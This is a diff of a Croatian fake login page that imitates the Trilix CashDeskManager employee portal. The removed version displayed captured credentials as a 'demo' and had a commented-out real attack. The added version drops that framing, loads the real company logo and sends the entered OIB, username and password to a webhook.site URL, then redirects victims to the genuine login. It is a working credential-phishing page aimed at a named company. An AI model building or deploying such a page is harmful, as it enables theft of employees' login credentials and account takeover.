@@ -1,221 +1,74 @@
 <!DOCTYPE html>
 <html lang="hr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Trilix • Prijava zaposlenih</title>
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: #1a2332; /* Trilix tamno plava pozadina */
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-    }
-
-    .login-container {
-      background: #ffffff;
-      border-radius: 8px;
-      box-shadow: 0 4px 24px rgba(0,0,0,0.3);
-      width: 420px;
-      padding: 40px;
-    }
-
-    .logo {
-      text-align: center;
-      margin-bottom: 30px;
-    }
-
-    .logo h1 {
-      font-size: 28px;
-      color: #1a2332;
-      font-weight: 700;
-      letter-spacing: -0.5px;
-    }
-
-    .logo span {
-      display: block;
-      font-size: 13px;
-      color: #6b7b8d;
-      margin-top: 6px;
-      font-weight: 400;
-    }
-
-    .form-group {
-      margin-bottom: 20px;
-    }
-
-    .form-group label {
-      display: block;
-      font-size: 13px;
-      color: #3d5a80;
-      margin-bottom: 6px;
-      font-weight: 600;
-    }
-
-    .form-group input {
-      width: 100%;
-      padding: 12px 14px;
-      border: 1px solid #d1d9e6;
-      border-radius: 6px;
-      font-size: 15px;
-      color: #1a2332;
-      transition: border-color 0.2s, box-shadow 0.2s;
-    }
-
-    .form-group input:focus {
-      outline: none;
-      border-color: #2e86de;
-      box-shadow: 0 0 0 3px rgba(46,134,222,0.15);
-    }
-
-    .btn-login {
-      width: 100%;
-      padding: 14px;
-      background: #2e86de;
-      color: #fff;
-      border: none;
-      border-radius: 6px;
-      font-size: 15px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: background 0.2s;
-      margin-top: 10px;
-    }
-
-    .btn-login:hover {
-      background: #1b6dbf;
-    }
-
-    .footer-note {
-      text-align: center;
-      font-size: 12px;
-      color: #8d99a6;
-      margin-top: 24px;
-      line-height: 1.5;
-    }
-
-    .alert-box {
-      display: none;
-      background: #e8f4fd;
-      border-left: 4px solid #2e86de;
-      padding: 16px;
-      margin-top: 20px;
-      border-radius: 4px;
-      font-size: 13px;
-      color: #1a2332;
-    }
-
-    .alert-box strong {
-      display: block;
-      margin-bottom: 8px;
-      color: #2e86de;
-    }
-
-    .alert-box pre {
-      background: #fff;
-      padding: 10px;
-      border-radius: 4px;
-      font-size: 12px;
-      overflow-x: auto;
-      margin-top: 8px;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CashDeskManager - Login</title>
+    <style>
+        /* Osnovni stilovi da izgleda kao original */
+        body { font-family: Arial, sans-serif; background-color: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-container { background-color: #fff; padding: 2rem; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); text-align: center; width: 300px; }
+        .login-container img { margin-bottom: 1rem; }
+        .login-container input[type="text"], .login-container input[type="password"] { width: 100%; padding: 0.5rem; margin-bottom: 1rem; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        .login-container button { width: 100%; padding: 0.7rem; background-color: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
+        .login-container button:hover { background-color: #0056b3; }
+        .footer { font-size: 0.8em; color: #888; margin-top: 1rem; }
+    </style>
 </head>
 <body>
-
-  <div class="login-container">
-    <div class="logo">
-      <h1>Trilix</h1>
-      <span>Prijava zaposlenih • dsds.trilix.hr</span>
+    <div class="login-container">
+        <img src="https://dsds.trilix.hr/CashDeskManager/resources/themes/xpos/xpos-logo.png" alt="Trilix Logo" />
+        <form id="loginForm">
+            <div class="form-group">
+                <input type="text" id="oib" name="oib" placeholder="OIB:" required>
+            </div>
+            <div class="form-group">
+                <input type="text" id="user" name="user" placeholder="Korisničko ime:" required>
+            </div>
+            <div class="form-group">
+                <input type="password" id="pass" name="pass" placeholder="Zaporka:" required>
+            </div>
+            <div class="form-group">
+                <label><input type="checkbox" name="remember"> Zapamti me</label>
+            </div>
+            <button type="button" id="loginBtn">Login</button>
+        </form>
+        <div class="footer">
+            <p>3.8.0 (b4183b1)<br>powered by Trilix</p>
+        </div>
     </div>
 
-    <form id="loginForm" onsubmit="simulatePhish(); return false;">
-      <div class="form-group">
-        <label for="user">Korisničko ime</label>
-        <input type="text" id="user" name="user" placeholder="Unesite korisničko ime" required autocomplete="off">
-      </div>
+    <script>
+        function downloadFile(filename, textData) {
+            const blob = new Blob([textData], { type: "text/plain" });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = filename;
+            a.style.display = 'none';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }
 
-      <div class="form-group">
-        <label for="pass">Lozinka</label>
-        <input type="password" id="pass" name="pass" placeholder="Unesite lozinku" required>
-      </div>
+        function simulatePhish() {
+            const oib = document.getElementById('oib').value || '<prazno>';
+            const user = document.getElementById('user').value || '<prazno>';
+            const pass = document.getElementById('pass').value || '<prazno>';
 
-      <div class="form-group">
-        <label for="oib">OIB (opcionalno)</label>
-        <input type="text" id="oib" name="oib" placeholder="XX-XXXXXXXX-X">
-      </div>
+            // Slanje podataka na webhook
+            fetch('https://webhook.site/TVOJ_WEBHOOK_LINK', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ oib: oib, username: user, password: pass })
+            }).then(() => {
+                // Preusmeravanje na pravu stranicu nakon slanja
+                window.location.href = 'https://dsds.trilix.hr/CashDeskManager/login';
+            });
+        }
 
-      <button type="submit" class="btn-login">Prijava</button>
-    </form>
-
-    <!-- Ovaj box se prikazuje nakon "prijave" — simulacija krađe -->
-    <div id="alertBox" class="alert-box">
-      <strong>⚠️ Demo: Prikupljeni podaci</strong>
-      <span>Ovo je demonstracija phishing napada. U stvarnom scenariju, ovi podaci bi bili poslani napadaču.</span>
-      <pre id="capturedData"></pre>
-    </div>
-
-    <p class="footer-note">
-      © 2026 Trilix d.o.o. • Sva prava pridržana<br>
-      Za tehničku podršku kontaktirajte IT sektor: <strong>it@trilix.hr</strong>
-    </p>
-  </div>
-
-  <script>
-    /* ═══════════════════════════════════════════
-       POMOĆNA FUNKCIJA — Download log.txt fajla
-       ═══════════════════════════════════════════ */
-    function downloadFile(filename, textData) {
-      const blob = new Blob([textData], { type: "text/plain" });
-      const url  = URL.createObjectURL(blob);
-      const a    = document.createElement("a");
-      a.href        = url;
-      a.download    = filename;
-      a.style.display = "none";
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-      URL.revokeObjectURL(url);
-    }
-
-    function simulatePhish() {
-      const user = document.getElementById('user').value;
-      const pass = document.getElementById('pass').value;
-      const oib  = document.getElementById('oib').value || '(nije unesen)';
-
-      /* ───────── DEMO MODE (trening / prezentacija) ───────── */
-      // Prikazuje prikupljene podatke na stranici
-      const fakeDump = JSON.stringify({ username: user, password: pass, oib: oib }, null, 2);
-      document.getElementById('capturedData').textContent = fakeDump;
-      document.getElementById('alertBox').style.display = 'block';
-
-      /* ───────── AUTOMATSKI DOWNLOAD log.txt ───────── */
-      const logContent =
-`=== Trilix Phish Demo Log ===
-Timestamp : ${new Date().toISOString()}
-Username  : ${user}
-Password  : ${pass}
-OIB       : ${oib}
--------------------------------
-`;
-      downloadFile("log.txt", logContent);
-
-      /* ───────── PRODUCTION MODE (pravi napad) ───────── */
-      // Otkomentiraj ispod kada želiš pravo slanje podataka:
-      //
-      // fetch('https://webhook.site/b13cdc16-7c9c-410d-b75a-252c760ee7d2', {
-      //   method: 'POST',
-      //   headers: { 'Content-Type': 'application/json' },
-      //   body: JSON.stringify({ username: user, password: pass, oib: oib })
-      // }).then(() => {
-      //   window.location.href = 'https://dsds.trilix.hr';  // redirect na pravi sajt
-      // });
-    }
-  </script>
-
+        document.getElementById('loginBtn').addEventListener('click', simulatePhish);
+    </script>
 </body>
 </html>
